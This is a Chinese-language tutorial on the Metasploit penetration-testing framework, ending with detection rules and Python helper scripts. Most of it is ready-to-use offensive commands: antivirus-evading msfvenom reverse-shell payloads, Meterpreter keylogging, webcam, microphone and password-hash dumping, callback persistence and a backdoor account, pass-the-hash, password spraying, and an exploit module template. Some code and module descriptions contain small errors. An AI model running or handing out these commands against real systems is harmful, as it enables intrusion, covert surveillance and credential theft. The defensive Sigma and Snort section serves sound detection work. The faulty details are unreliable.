# Metasploit框架实战指南

> Metasploit Framework（MSF）是全球最知名的开源渗透测试框架，集成了漏洞利用、辅助扫描、后渗透操作和载荷生成等功能，是渗透测试和红蓝对抗的核心工具。

---

## 一、Metasploit框架概述

### 1.1 MSF架构

Metasploit 采用模块化架构，各组件协同工作形成完整的渗透测试流程：

```
Metasploit 架构:
├── 模块（Modules）       → 核心，各种漏洞利用和功能实现
├── 插件（Plugins）       → 扩展功能（如 Nessus/OpenVAS 集成）
├── 接口（Interfaces）    → msfconsole / msfweb / msf rpc
├── 工具集（Tools）       → msfvenom / msfdb / msfrpc
├── 数据库（Database）    → PostgreSQL 存储工作区/主机/凭据
└── 库（Libraries）      → Rex（基础库）/ Msf::Core / Msf::Base
```

### 1.2 模块类型详解

| 模块类型 | 路径前缀 | 功能说明 |
|----------|----------|----------|
| exploit | exploit/ | 漏洞利用模块，组合漏洞利用代码和载荷 |
| auxiliary | auxiliary/ | 辅助模块，扫描/嗅探/Fuzz/信息收集 |
| post | post/ | 后渗透模块，已获取 Shell 后的操作 |
| payload | payload/ | 载荷模块，执行在目标上的代码（Shellcode） |
| encoder | encoder/ | 编码器，对载荷编码以规避检测 |
| evasion | evasion/ | 规避模块，生成绕过杀软的载荷 |
| nop | nop/ | NOP 空指令生成器，填充载荷保持稳定性 |

### 1.3 环境配置与更新

```bash
# Kali Linux 中 MSF 已预装，更新方式:
apt update && apt install metasploit-framework

# 初始化数据库:
msfdb init

# 启动 MSF 并连接数据库:
msfconsole
msf6 > db_status    # 检查数据库连接

# 常用配置:
# ~/.msf4/ 目录下存放用户配置
# /usr/share/metasploit-framework/ 为安装目录
```

---

## 二、MSF基础操作

### 2.1 工作区管理

工作区（Workspace）用于隔离不同测试项目的数据：

```
msf6 > workspace              # 查看当前工作区
msf6 > workspace -a ProjectA  # 创建并切换到新工作区
msf6 > workspace ProjectA     # 切换到指定工作区
msf6 > workspace -d ProjectA  # 删除工作区
msf6 > workspace -r ProjectA ProjectB  # 重命名
```

### 2.2 模块搜索与选择

```
msf6 > search ms17_010              # 按名称搜索
msf6 > search type:exploit          # 按类型搜索
msf6 > search name:eternalblue      # 按名称搜索
msf6 > search platform:windows     # 按平台搜索
msf6 > search rank:excellent       # 按可靠性等级搜索
msf6 > search cve:2021-44228       # 按 CVE 编号搜索

msf6 > use exploit/windows/smb/ms17_010_eternalblue  # 选择模块
msf6 (exploit) > info              # 查看模块详情
msf6 (exploit) > show options      # 查看可用参数
msf6 (exploit) > show targets      # 查看可用目标
msf6 (exploit) > show payloads     # 查看兼容 Payload
msf6 (exploit) > show advanced     # 查看高级选项
```

### 2.3 参数配置

```
msf6 > set RHOSTS 192.168.1.100       # 设置目标主机
msf6 > set RHOSTS 192.168.1.0/24      # 设置目标网段（批量）
msf6 > set RPORT 445                   # 设置目标端口
msf6 > set LHOST 192.168.1.5           # 设置本地监听地址
msf6 > set LPORT 4444                  # 设置本地监听端口
msf6 > set THREADS 10                  # 设置并发线程数
msf6 > set TARGET 0                    # 选择目标编号
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp  # 设置 Payload
msf6 > setg LHOST 192.168.1.5         # 设置全局参数（所有模块生效）
msf6 > setg LPORT 4444
```

### 2.4 执行与结果查看

```
msf6 > exploit            # 执行利用（也可简写为 run）
msf6 > exploit -j         # 后台执行（用于批量扫描）
msf6 > sessions            # 查看活跃会话
msf6 > sessions -l        # 列出所有会话
msf6 > sessions -i 1      # 切换到会话 1
msf6 > sessions -k         # 关闭所有会话

msf6 > hosts               # 查看发现的主机
msf6 > services            # 查看发现的服务
msf6 > vulns               # 查看发现的漏洞
msf6 > creds               # 查看获取的凭据
msf6 > loot                # 查看获取的文件证据
```

---

## 三、Payload深入

### 3.1 Meterpreter功能详解

Meterpreter 是 MSF 的核心后渗透载荷，运行在内存中，提供丰富的操作能力。

**文件操作**

```
meterpreter > upload /local/path/file.txt C:\\target\\path\\     # 上传文件
meterpreter > download C:\\target\\file.txt /local/path/         # 下载文件
meterpreter > cat C:\\Windows\\win.ini                           # 查看文件内容
meterpreter > edit C:\\target\\config.txt                        # 编辑文件
meterpreter > cd C:\\Users\\Public                                # 切换目录
meterpreter > ls                                                  # 列出文件
meterpreter > pwd                                                 # 当前路径
meterpreter > mkdir C:\\temp\\test                                # 创建目录
meterpreter > rm C:\\target\\file.txt                             # 删除文件
```

**系统命令**

```
meterpreter > sysinfo              # 系统信息（OS/架构/主机名）
meterpreter > getuid               # 当前用户权限
meterpreter > getpid               # 当前进程 ID
meterpreter > ps                   # 进程列表
meterpreter > migrate <PID>        # 迁移到其他进程（提升稳定性）
meterpreter > execute -f cmd.exe -i -H  # 执行程序并交互
meterpreter > shell                # 获取系统 Shell
meterpreter > hashdump            # 导出密码哈希（需 SYSTEM 权限）
meterpreter > getsystem           # 尝试提权到 SYSTEM
meterpreter > reboot / shutdown   # 重启/关机
```

**网络操作**

```
meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.5   # 端口转发
meterpreter > portfwd list                              # 查看转发列表
meterpreter > route add 10.0.0.0/24 1                 # 添加路由（1为会话号）
meterpreter > route list                                # 查看路由
meterpreter > run arp_scanner -r 10.0.0.0/24          # ARP 扫描内网
meterpreter > run post/multi/manage/autoroute SUBNET=10.0.0.0/24  # 自动添加路由
```

**摄像头与麦克风**

```
meterpreter > record_mic -d 30              # 录音 30 秒
meterpreter > webcam_list                    # 列出摄像头
meterpreter > webcam_snap -i 1               # 拍照
meterpreter > webcam_stream -i 1             # 视频流
```

**屏幕截图与键盘记录**

```
meterpreter > screenshot -p /tmp/screen.png  # 屏幕截图
meterpreter > screenshare                     # 实时屏幕监控（Web界面）
meterpreter > keyscan_start                  # 开始键盘记录
meterpreter > keyscan_dump                   # 导出键盘记录
meterpreter > keyscan_stop                  # 停止键盘记录
```

### 3.2 Stager与Stageless

```
Staged Payload（分阶段）:
├── Stager: 小体积初始载荷，建立连接后下载完整载荷
├── Stage: 完整的 Meterpreter 载荷
├── 优点: 体积小，适合严格长度限制
├── 缺点: 两次网络通信，留有网络指纹
└── 示例: windows/meterpreter/reverse_tcp

Stageless Payload（无阶段）:
├── 完整载荷一次性嵌入，无需二次下载
├── 优点: 单次通信，减少网络指纹
├── 缺点: 体积较大
└── 示例: windows/meterpreter_reverse_tcp
```

### 3.3 Payload编码与规避

```bash
# Msfvenom 生成带编码的 Payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \                      # 编码迭代次数
  -f exe \                    # 输出格式
  -o payload.exe

# 多轮编码
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.5 LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 \
  -x /usr/share/windows-binaries/plink.exe \  # 模板文件
  -k \                        # 保持模板功能
  -f exe -o evaded.exe

# 常用编码器:
# x86/shikata_ga_nai    → 多态编码，最常用
# x86/countdown         → 倒计时编码
# x86/fnsteg_mov        # 
# cmd/powershell_base64 → PowerShell 编码
# php/base64            → PHP Base64 编码
```

### 3.4 自定义Payload生成

```bash
# 生成不同格式的 Payload
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.php
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw -o shell.py
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f war -o shell.war
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f elf -o shell.elf

# 查看 Payload 选项
msfvenom -p windows/meterpreter/reverse_tcp --list-options
```

---

## 四、常用Exploit模块分类

### 4.1 辅助扫描模块

**端口扫描**

```
# TCP 端口扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
set THREADS 50
run

# SYN 扫描（需 root）
use auxiliary/scanner/portscan/syn

# UDP 扫描
use auxiliary/scanner/portscan/udp
```

**服务扫描**

```
# SMB 扫描
use auxiliary/scanner/smb/smb_version      # SMB 版本
use auxiliary/scanner/smb/smb_enumusers    # 枚举用户
use auxiliary/scanner/smb/smb_login        # SMB 密码爆破

# SSH 扫描
use auxiliary/scanner/ssh/ssh_version     # SSH 版本
use auxiliary/scanner/ssh/ssh_login       # SSH 登录
use auxiliary/scanner/ssh/ssh_enumusers   # 枚举用户

# HTTP 扫描
use auxiliary/scanner/http/http_version    # HTTP 版本
use auxiliary/scanner/http/dir_scanner     # 目录扫描
use auxiliary/scanner/http/files_dir       # 文件扫描
use auxiliary/scanner/http/robots_txt      # robots.txt

# MSSQL 扫描
use auxiliary/scanner/mssql/mssql_ping     # MSSQL 探测
use auxiliary/scanner/mssql/mssql_login    # 密码爆破
```

**漏洞验证扫描**

```
# 永恒之蓝检测
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run

# Log4Shell 检测
use auxiliary/scanner/http/log4shell_log4j_rce

# 其他验证模块
use auxiliary/scanner/smb/smb_uninit_cred   # CVE-2020-0796 检测
```

### 4.2 常用Exploit

**Windows系统漏洞**

```
# MS17-010 永恒之蓝
use exploit/windows/smb/ms17_010_eternalblue
# 原理: SMBv1 协议处理 TRANS2 请求时存在缓冲区溢出
# 攻击者发送精心构造的 SMB 数据包，导致内核态缓冲区溢出
# 可在无需认证的情况下远程执行任意代码
# 影响: Windows XP ~ Windows Server 2016

# MS08-067
use exploit/windows/smb/ms08_067_netapi
# 原理: Server 服务处理 RPC 请求时存在缓冲区溢出
# 经典蠕虫传播漏洞（Conficker 蠕虫利用）

# CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
# 原理: Windows 打印后台处理服务存在逻辑缺陷
# 允许低权限用户以 SYSTEM 权限加载任意 DLL

# CVE-2020-0796 (SMBGhost)
use exploit/windows/smb/cve_2020_0796_smbghost
# 原理: SMBv3 协议处理压缩消息时存在整数溢出
# 可导致远程代码执行或内核信息泄露
```

**Web应用漏洞利用**

```
# Tomcat 管理后台部署
use exploit/multi/http/tomcat_mgr_deploy
# 利用 Tomcat 管理后台部署 WAR 包获取 Shell

# Jenkins RCE
use exploit/multi/http/jenkins_script_console
# 利用 Jenkins 脚本控制台执行 Groovy 代码

# Drupalgeddon
use exploit/unix/webapp/drupal_drupalgeddon2
# Drupal CVE-2018-7600 远程代码执行
```

### 4.3 后渗透模块

**权限提升**

```
meterpreter > getsystem                      # 自动提权尝试
# 利用多种技术:
# - Named Pipe Impersonation（需 SYSTEM 调用）
# - Token Duplication
# - Bypass UAC

run post/multi/recon/local_exploit_suggester  # 漏洞建议模块
# 自动检测目标可用的本地提权漏洞

# 常用提权 Exploit:
exploit/windows/local/ms16_032_secondary_logon_handle_privesc
exploit/windows/local/bypassuac_injection_winsxs
exploit/windows/local/cve_2021_1675_printnightmare
```

**信息收集**

```
# Windows 信息枚举
run post/windows/gather/enum_applications    # 安装的应用
run post/windows/gather/enum_services        # 服务列表
run post/windows/gather/credentials/credential_collector  # 凭据收集
run post/windows/gather/hashdump            # 密码哈希导出
run post/multi/gather/env                   # 环境变量
run post/windows/gather/arp_scanner         # ARP 扫描

# Linux 信息枚举
run post/linux/gather/enum_system           # 系统信息
run post/linux/gather/enum_network          # 网络信息
run post/linux/gather/hashdump              # 密码哈希
run post/multi/gather/ssh_creds             # SSH 凭据
```

**持久化**

```
# 计划任务持久化
run persistence -X -i 60 -p 4444 -r 192.168.1.5
# 每 60 秒尝试回连，设置自动运行

# 注册表持久化
run post/windows/manage/persistence_exe
# 将 Payload 写入注册表自启动项

# 服务持久化
run post/windows/manage/install_service
# 安装为 Windows 服务

# 账户持久化
run post/windows/manage/add_user USERNAME=hacker PASSWORD=P@ss123
# 添加后门用户
```

**横向移动**

```
# PsExec 横向移动
use exploit/windows/smb/psexec
set RHOST 192.168.1.50
set SMBUser administrator
set SMBPass password123
# 或使用哈希: set SMBPass aad3b...:8846f...
run

# WMI 横向移动
use exploit/windows/local/wmi
# 通过 WMI 远程执行

# SMB 登录检测
use auxiliary/scanner/smb/smb_login
set USER_FILE users.txt
set PASS_FILE passwords.txt
# 批量密码喷洒

# 传递哈希（Pass-the-Hash）
use exploit/windows/smb/psexec
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e167c01a
```

---

## 五、MSF自动化与扩展

### 5.1 资源脚本（.rc自动化脚本）

资源脚本将常用 MSF 命令写入文件，实现自动化执行：

```bash
# auto_exploit.rc
workspace -a AutoScan
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443,445,3389,8080
set THREADS 50
run

use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
set THREADS 20
run

# 执行方式:
msfconsole -r auto_exploit.rc
```

### 5.2 Metasploit RPC API

MSF 提供 RPC 接口，支持远程调用所有功能：

```bash
# 启动 RPC 服务
msfrpcd -U msf -P secret -p 55553 -a 0.0.0.0
# -U: 用户名, -P: 密码, -p: 端口, -a: 监听地址
```

### 5.3 Python调用MSF（pymetasploit3）

```python
from pymetasploit3.msfrpc import MsfRpcClient

# 连接 MSF RPC
client = MsfRpcClient('secret', server='127.0.0.1', port=55553, ssl=True)

# 创建工作区
workspace = client.workspaces.add('PythonScan')

# 搜索模块
exploits = client.modules.exploits
smb_modules = [m for m in exploits if 'smb' in m]

# 执行辅助模块
scanner = client.modules.use('auxiliary', 'scanner/portscan/tcp')
scanner['RHOSTS'] = '192.168.1.0/24'
scanner['PORTS'] = '445'
scanner['THREADS'] = '20'
result = scanner.execute()

# 查看 Shellcode 执行结果
print(result['job_id'])
```

### 5.4 自定义模块编写

**简单Auxiliary模块示例**

```ruby
# modules/auxiliary/scanner/custom_scan.rb
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Custom Service Banner Grabber',
      'Description' => 'Connects to target port and reads banner',
      'Author' => 'Security Researcher',
      'License' => MSF_LICENSE
    )
    register_options([
      Opt::RHOST(),
      Opt::RPORT(8080)
    ])
  end

  def run_host(ip)
    begin
      connect
      banner = sock.get_once
      print_good("#{ip}:#{rport} - Banner: #{banner.strip}") if banner
      disconnect
    rescue Rex::ConnectionError
      print_error("#{ip}:#{rport} - Connection failed")
    end
  end
end
```

**简单Exploit模块示例**

```ruby
# modules/exploits/custom/rce_example.rb
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name' => 'Custom Web App RCE',
      'Description' => 'Exploits command injection in custom web app',
      'Author' => 'Security Researcher',
      'License' => MSF_LICENSE,
      'Targets' => [
        ['Automatic', { 'Platform' => 'linux', 'Arch' => ARCH_X64 }]
      ],
      'Payload' => {
        'Space' => 1024,
        'BadChars' => "\x00\x0a\x0d"
      }
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/']),
      OptString.new('CMD_PARAM', [true, 'Vulnerable parameter', 'cmd'])
    ])
  end

  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => { datastore['CMD_PARAM'] => 'id' }
    )
    if res && res.body.include?('uid=')
      return Exploit::CheckCode::Vulnerable
    end
    Exploit::CheckCode::Safe
  end

  def exploit
    send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'vars_get' => { datastore['CMD_PARAM'] => payload.encoded }
    )
  end
end
```

---

## 六、MSF与C2框架对比

| 特性 | Metasploit | Cobalt Strike | Sliver | Mythic |
|------|-----------|---------------|--------|--------|
| 类型 | 开源 | 商业 | 开源 | 开源框架 |
| 语言 | Ruby | Java/C | Go | 多语言 |
| Payload | Meterpreter | Beacon | Implant | 模块化 |
| 免杀能力 | 中等（编码器） | 强（Artifact Kit） | 较强 | 强（自定义模块） |
| 横向移动 | 内置模块 | Beacon 横向 | 内置 | 依赖模块 |
| 稳定性 | 中等 | 高 | 高 | 高 |
| 报告功能 | 基础 | 强 | 基础 | 强 |
| 社区支持 | 广泛 | 有限 | 增长中 | 活跃 |
| 适用场景 | 渗透测试/教学 | 红队评估 | 红队评估 | 自定义 C2 |

**框架选择原则**：
- MSF：适合渗透测试教学、漏洞验证、单次评估
- Cobalt Strike：适合专业红队评估、APT 模拟
- Sliver：开源替代方案，适合小型团队
- Mythic：适合需要高度自定义 C2 的场景

---

## 七、检测与防御

### 7.1 Meterpreter特征与检测

```
Meterpreter 内存特征:
├── 注入到合法进程（explorer.exe / svchost.exe）
├── 反射 DLL 加载（无文件落地）
├── 加密通信（TLV 协议）
├── 心跳连接模式（定期回连）
└── 特定 API 调用模式

检测方法:
├── 内存扫描（搜索 Meterpreter 签名）
├── 网络流量分析（检测 TLV 协议特征）
├── 行为分析（异常进程注入、网络外连）
├── 注册表监控（持久化特征）
└── 端点检测响应（EDR）告警
```

### 7.2 MSF通信加密分析

```
Meterpreter 通信特征:
├── 默认使用 TLV（Type-Length-Value）协议
├── 通信可配置为明文或加密
├── 默认监听端口 4444（可修改）
├── HTTP/S 传输模式模拟正常 Web 流量
└── 常见特征: 固定 User-Agent / 特定 Cookie 格式

检测策略:
├── 异常外连端口检测（非标准端口）
├── TLS 证书分析（自签名/异常 CN）
├── 流量频率分析（固定间隔心跳）
├── User-Agent 指纹匹配
└── JA3/JA3S TLS 指纹
```

### 7.3 蓝队检测规则

**Sigma规则示例（Meterpreter检测）**

```yaml
title: Metasploit Meterpreter Activity
status: experimental
description: Detects Meterpreter process injection patterns
logsource:
    product: windows
    category: process_creation
detection:
    selection_migrate:
        CommandLine|contains:
            - 'migrate'
            - 'stager'
    selection_reflective_dll:
        CommandLine|contains|all:
            - 'rundll32'
            - '.dll'
    condition: selection_migrate or selection_reflective_dll
level: high
tags:
    - attack.execution
    - attack.t1055
```

**Snort规则示例**

```
# Meterpreter 反向连接检测
alert tcp $HOME_NET any -> $EXTERNAL_NET any (
  msg:"Meterpreter Reverse TCP Connection";
  flow:to_server,established;
  content:"|00 00 00 40|";
  depth:4;
  content:"|00 00 00 05 00 0f 00|";
  within:20;
  sid:1000001;
  rev:1;
)

# MS17-010 永恒之蓝流量检测
alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (
  msg:"MS17-010 EternalBlue SMB Exploit Attempt";
  flow:to_server,established;
  content:"|ff 53 4d 42|";
  offset:4;
  depth:4;
  content:"|05 02 00 c0|";
  distance:0;
  sid:1000002;
  rev:1;
)
```

---

## 八、Python MSF辅助脚本示例

以下脚本使用模拟数据，仅用于演示自动化思路。

### 8.1 批量漏洞验证脚本（模拟数据）

```python
#!/usr/bin/env python3
"""
Metasploit 批量漏洞验证辅助脚本
使用模拟数据演示自动化漏洞验证思路
仅用于教育目的
"""
import json
from datetime import datetime
from typing import List, Dict

# 模拟 MSF RPC 客户端接口
class MockMSFRpcClient:
    """模拟 MSF RPC 客户端，不连接真实服务"""
    def __init__(self):
        self.hosts = []
        self.vulns_found = []

    def scan_host(self, host: str, port: int) -> Dict:
        """模拟扫描单个主机"""
        mock_services = {
            445: {"service": "smb", "version": "Windows 7"},
            80: {"service": "http", "version": "Apache 2.4"},
            22: {"service": "ssh", "version": "OpenSSH 7.2"},
            3389: {"service": "rdp", "version": "Microsoft RDP"},
        }
        return {
            "host": host,
            "port": port,
            "state": "open" if port in mock_services else "closed",
            "service": mock_services.get(port, {}).get("service", "unknown"),
        }

    def check_vuln(self, host: str, vuln_module: str) -> Dict:
        """模拟漏洞验证"""
        mock_results = {
            "ms17_010": {"status": "vulnerable", "severity": "critical"},
            "cve_2021_44228": {"status": "not_vulnerable", "severity": "high"},
            "cve_2020_0796": {"status": "vulnerable", "severity": "high"},
        }
        result = mock_results.get(
            vuln_module,
            {"status": "unknown", "severity": "info"}
        )
        result["host"] = host
        result["module"] = vuln_module
        result["timestamp"] = datetime.now().isoformat()
        if result["status"] == "vulnerable":
            self.vulns_found.append(result)
        return result

    def generate_report(self) -> Dict:
        """生成扫描报告"""
        return {
            "scan_time": datetime.now().isoformat(),
            "total_hosts": len(self.hosts),
            "total_vulns": len(self.vulns_found),
            "vulnerabilities": self.vulns_found,
            "summary": self._summarize()
        }

    def _summarize(self) -> str:
        critical = sum(1 for v in self.vulns_found if v["severity"] == "critical")
        high = sum(1 for v in self.vulns_found if v["severity"] == "high")
        return f"Critical: {critical}, High: {high}"


def batch_vuln_check(target_hosts: List[str], vuln_modules: List[str]):
    """批量漏洞验证主流程"""
    client = MockMSFRpcClient()

    print("=" * 60)
    print("Metasploit 批量漏洞验证（模拟模式）")
    print("=" * 60)

    # 阶段一: 端口扫描
    print("\n[阶段一] 端口扫描")
    print("-" * 40)
    scan_ports = [22, 80, 445, 3389, 8080]
    for host in target_hosts:
        client.hosts.append(host)
        print(f"\n扫描主机: {host}")
        for port in scan_ports:
            result = client.scan_host(host, port)
            if result["state"] == "open":
                print(f"  [+] {host}:{port} - {result['service']} OPEN")

    # 阶段二: 漏洞验证
    print("\n[阶段二] 漏洞验证")
    print("-" * 40)
    for host in target_hosts:
        for module in vuln_modules:
            result = client.check_vuln(host, module)
            status = result["status"]
            severity = result["severity"]
            if status == "vulnerable":
                print(f"  [!] {host} - {module}: {status} ({severity})")
            else:
                print(f"  [ok] {host} - {module}: {status}")

    # 阶段三: 生成报告
    print("\n[阶段三] 生成报告")
    print("-" * 40)
    report = client.generate_report()
    print(json.dumps(report, indent=2, ensure_ascii=False))
    return report


if __name__ == "__main__":
    # 模拟目标主机列表
    targets = ["192.168.1.10", "192.168.1.20", "192.168.1.30"]
    # 验证模块列表
    modules = ["ms17_010", "cve_2021_44228", "cve_2020_0796"]
    batch_vuln_check(targets, modules)
```

### 8.2 扫描结果导入脚本

```python
#!/usr/bin/env python3
"""
Nmap 扫描结果导入 MSF 数据库辅助脚本
将 Nmap XML 结果解析并格式化为 MSF 可用格式
仅用于教育目的
"""
import xml.etree.ElementTree as ET
import json
from typing import List, Dict


def parse_nmap_xml(xml_file: str) -> List[Dict]:
    """解析 Nmap XML 扫描结果"""
    tree = ET.parse(xml_file)
    root = tree.getroot()

    hosts = []
    for host_elem in root.findall('host'):
        addr_elem = host_elem.find('address')
        if addr_elem is None:
            continue

        host = {
            "address": addr_elem.get('addr'),
            "hostnames": [],
            "ports": [],
            "os": "unknown"
        }

        # 提取主机名
        hostnames_elem = host_elem.find('hostnames')
        if hostnames_elem is not None:
            for hn in hostnames_elem.findall('hostname'):
                host["hostnames"].append(hn.get('name'))

        # 提取端口信息
        ports_elem = host_elem.find('ports')
        if ports_elem is not None:
            for port_elem in ports_elem.findall('port'):
                state = port_elem.find('state')
                service = port_elem.find('service')
                port_info = {
                    "port": int(port_elem.get('portid')),
                    "protocol": port_elem.get('protocol'),
                    "state": state.get('state') if state is not None else "unknown",
                    "service": service.get('name') if service is not None else "unknown",
                    "product": service.get('product') if service is not None else "",
                    "version": service.get('version') if service is not None else ""
                }
                if port_info["state"] == "open":
                    host["ports"].append(port_info)

        # 提取操作系统信息
        os_elem = host_elem.find('os')
        if os_elem is not None:
            osmatch = os_elem.find('osmatch')
            if osmatch is not None:
                host["os"] = osmatch.get('name', 'unknown')

        if host["ports"]:
            hosts.append(host)

    return hosts


def generate_msf_commands(hosts: List[Hosts]) -> str:
    """根据扫描结果生成 MSF 命令"""
    commands = []
    commands.append("# MSF 自动化命令脚本")
    commands.append("# 由扫描结果导入脚本生成")
    commands.append("workspace -a ImportedScan")
    commands.append("")

    for host in hosts:
        addr = host["address"]
        commands.append(f"# === {addr} ===")

        # 根据开放端口生成对应命令
        for port_info in host["ports"]:
            port = port_info["port"]
            service = port_info["service"]

            if service == "smb" or port == 445:
                commands.append(f"setg RHOSTS {addr}")
                commands.append("use auxiliary/scanner/smb/smb_ms17_010")
                commands.append("run")
                commands.append("")

            elif service == "ssh" or port == 22:
                commands.append(f"setg RHOSTS {addr}")
                commands.append("use auxiliary/scanner/ssh/ssh_version")
                commands.append("run")
                commands.append("")

            elif service == "http" or port in [80, 8080]:
                commands.append(f"setg RHOSTS {addr}")
                commands.append("use auxiliary/scanner/http/http_version")
                commands.append("run")
                commands.append("")

            elif service == "mssql" or port == 1433:
                commands.append(f"setg RHOSTS {addr}")
                commands.append("use auxiliary/scanner/mssql/mssql_ping")
                commands.append("run")
                commands.append("")

    return "\n".join(commands)


# 使用示例（需提供真实 Nmap XML 文件）:
# nmap -sV -oX scan_results.xml 192.168.1.0/24
# hosts = parse_nmap_xml("scan_results.xml")
# commands = generate_msf_commands(hosts)
# print(commands)
# 保存为 .rc 文件: with open("auto_scan.rc", "w") as f: f.write(commands)
```

---

> **免责声明**: 本文档仅用于网络安全教育和授权渗透测试培训。所有技术说明均基于教育目的，不提供可直接用于未授权系统的攻击方法。未经授权对他人系统进行渗透测试属于违法行为。使用 Metasploit 等工具时，请确保已获得合法书面授权。
